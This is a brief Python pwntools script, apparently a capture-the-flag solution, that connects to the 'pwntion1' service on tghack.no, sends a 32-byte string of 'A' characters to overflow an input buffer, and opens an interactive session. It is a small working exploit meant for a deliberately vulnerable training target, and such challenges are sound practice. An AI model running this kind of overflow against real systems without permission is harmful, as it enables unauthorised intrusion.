from pwn import *

debug = False
if debug == True:
    r = process("./pwntion1_public")
else:
    r = remote("pwntion1.tghack.no", 1061)

r.recvuntil("Student:\n")
r.sendline("A" * 32)

r.interactive()
